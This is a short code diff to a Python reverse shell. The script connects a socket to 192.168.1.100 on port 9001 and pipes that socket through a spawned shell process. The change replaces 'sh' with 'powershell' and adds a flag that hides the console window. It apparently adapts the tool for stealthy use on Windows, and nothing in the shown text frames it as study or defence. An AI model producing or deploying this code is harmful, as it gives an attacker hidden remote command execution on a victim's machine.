@@ -10,11 +10,10 @@ def p2s(s, p):
     while True:
         s.send(p.stdout.read(1))
 
-
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("192.168.1.100",9001))
 
-p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
 
 s2p_thread = threading.Thread(target=s2p, args=[s, p])
 s2p_thread.daemon = True
